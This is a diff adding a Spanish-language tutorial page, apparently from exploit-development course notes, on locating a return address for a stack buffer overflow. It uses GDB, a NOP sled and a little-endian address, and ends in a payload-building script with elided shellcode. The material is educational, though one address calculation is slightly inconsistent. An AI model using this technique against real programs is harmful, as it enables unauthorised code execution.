@@ -1,0 +1,79 @@
+# Identification of the Return Address
+
+El último paso es encontrar la dirección de retorno que apunte a nuestro shellcode.
+
+## Encontrar la Dirección
+
+### Opción 1: Usar ESP como referencia
+
+```bash
+(gdb) run $(python -c 'print "\x55" * 817 + "\x90" * 124 + "<shellcode>" + "\x66" * 4')
+```
+
+Cuando ocurra el crash:
+```bash
+(gdb) info registers esp
+esp            0xffffd5c8
+```
+
+### Opción 2: Buscar NOPs en el stack
+
+```bash
+(gdb) x/500xb $esp
+```
+
+Buscar la secuencia de NOPs (`0x90`) y tomar una dirección en medio del NOP sled.
+
+## Calcular la Dirección de Retorno
+
+Si los NOPs están en `0xffffd5c0` aproximadamente, elegimos una dirección en medio:
+
+```
+NOP sled comienza: 0xffffd5c0
+NOP sled termina:  0xffffd63f (124 bytes)
+
+Dirección segura: 0xffffd5f0 (mitad del NOP sled)
+```
+
+## Considerar Endianness
+
+x86 usa **Little-Endian**, por lo que la dirección debe escribirse al revés:
+
+```
+Dirección: 0xffffd5f0
+En bytes (little-endian): \xf0\xd5\xff\xff
+```
+
+## Exploit Final
+
+```python
+# Exploit completo
+buffer = "\x55" * 817
+nops = "\x90" * 124
+shellcode = "\xda\xca\xba\xe4..."  # 95 bytes
+eip = "\xf0\xd5\xff\xff"  # Dirección de retorno
+
+payload = buffer + nops + shellcode + eip
+```
+
+## Verificar en GDB
+
+```bash
+(gdb) run $(python -c 'print "\x55" * 817 + "\x90" * 124 + "<shellcode>" + "\xf0\xd5\xff\xff"')
+```
+
+El programa debería saltar a nuestra dirección y ejecutar el NOP sled hasta el shellcode.
+
+## Importancia del NOP Sled
+
+- Permite margen de error en la dirección exacta
+- El CPU "desliza" a través de NOPs hasta el shellcode
+- Aumenta la probabilidad de éxito del exploit
+
+## Direcciones a Evitar
+
+| Dirección | Problema |
+|-----------|----------|
+| `0x00000000` | Contiene null bytes |
+| `0x000000xx` | Null bytes en los primeros bytes |
+| Direcciones con bad chars | Rompen el payload |
